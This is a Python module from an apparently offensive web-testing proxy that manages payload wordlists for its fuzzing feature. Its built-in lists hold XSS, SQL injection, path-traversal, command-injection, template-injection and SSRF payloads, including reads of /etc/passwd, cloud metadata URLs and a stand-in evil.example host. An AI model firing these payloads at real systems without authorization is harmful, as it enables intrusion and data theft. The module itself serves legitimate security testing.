"""Payload wordlists for Intruder.

Ships a handful of small, practical default lists, and manages user lists kept
as plain .txt files under ~/.r3dproxy/wordlists/ (one payload per line, blank
lines and lines starting with '#' ignored). Users can add their own either from
the GUI (Import) or from the terminal by dropping a .txt file into that folder.
"""
from __future__ import annotations
from pathlib import Path
from typing import Dict, List

from ..config import CONFIG_DIR

WORDLIST_DIR = CONFIG_DIR / "wordlists"

# --- Built-in defaults: intentionally short, high-signal starters. ---
BUILTIN: Dict[str, List[str]] = {
    "xss-basic": [
        "<script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "'><svg/onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        "\"><img src=x onerror=alert(document.domain)>",
        "'-alert(1)-'",
        "</title><script>alert(1)</script>",
        "<body onload=alert(1)>",
    ],
    "sqli-basic": [
        "'",
        "''",
        "' OR '1'='1",
        "' OR 1=1-- -",
        "\" OR \"1\"=\"1",
        "') OR ('1'='1",
        "' OR SLEEP(5)-- -",
        "1' ORDER BY 1-- -",
        "1' UNION SELECT NULL-- -",
        "admin'-- -",
        "' AND 1=CONVERT(int,@@version)-- -",
    ],
    "lfi-basic": [
        "../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "/etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
        "..\\..\\..\\..\\windows\\win.ini",
        "/proc/self/environ",
        "file:///etc/passwd",
    ],
    "cmd-injection": [
        "; id",
        "| id",
        "|| id",
        "& id",
        "&& id",
        "`id`",
        "$(id)",
        "; sleep 5",
        "| sleep 5",
        "%0aid",
        "\n/bin/cat /etc/passwd",
    ],
    "ssti-basic": [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "{{7*'7'}}",
        "${{7*7}}",
        "{{config}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
    ],
    "redirect-ssrf": [
        "http://127.0.0.1/",
        "http://localhost/",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::1]/",
        "//evil.example/",
        "http://127.0.0.1:80@evil.example/",
        "file:///etc/passwd",
        "gopher://127.0.0.1:6379/_INFO",
    ],
    "fuzz-chars": [
        "'", "\"", "`", "\\", "<", ">", "{", "}", "|", ";", "%00", "%0a", "%0d",
        "../", "..\\", "${}", "{{}}", "&", "#", "\u0000",
    ],
    "http-methods": [
        "GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE",
        "CONNECT", "PROPFIND", "MKCOL", "MOVE",
    ],
    "numbers-0-20": [str(i) for i in range(0, 21)],
}


def ensure_dir():
    try:
        WORDLIST_DIR.mkdir(parents=True, exist_ok=True)
    except Exception:
        pass


def _parse(text: str) -> List[str]:
    out = []
    for line in text.splitlines():
        s = line.rstrip("\n")
        if s.strip().startswith("#") or s == "":
            continue
        out.append(s)
    return out


def list_names() -> List[str]:
    """Built-in names first, then user .txt files (prefixed 'user:')."""
    names = [f"builtin:{k}" for k in BUILTIN]
    ensure_dir()
    try:
        for p in sorted(WORDLIST_DIR.glob("*.txt")):
            names.append(f"user:{p.stem}")
    except Exception:
        pass
    return names


def load(name: str) -> List[str]:
    if name.startswith("builtin:"):
        return list(BUILTIN.get(name.split(":", 1)[1], []))
    if name.startswith("user:"):
        p = WORDLIST_DIR / f"{name.split(':', 1)[1]}.txt"
        try:
            return _parse(p.read_text("utf-8", "replace"))
        except Exception:
            return []
    # bare path
    try:
        return _parse(Path(name).read_text("utf-8", "replace"))
    except Exception:
        return []


def import_file(src_path: str) -> str:
    """Copy an external wordlist into the user dir. Returns the new 'user:name'."""
    ensure_dir()
    src = Path(src_path)
    stem = src.stem or "imported"
    dest = WORDLIST_DIR / f"{stem}.txt"
    i = 1
    while dest.exists():
        dest = WORDLIST_DIR / f"{stem}-{i}.txt"
        i += 1
    dest.write_text(src.read_text("utf-8", "replace"), "utf-8")
    return f"user:{dest.stem}"


def save_user(name: str, payloads: List[str]) -> str:
    ensure_dir()
    safe = "".join(c for c in name if c.isalnum() or c in "-_") or "custom"
    dest = WORDLIST_DIR / f"{safe}.txt"
    dest.write_text("\n".join(payloads), "utf-8")
    return f"user:{safe}"
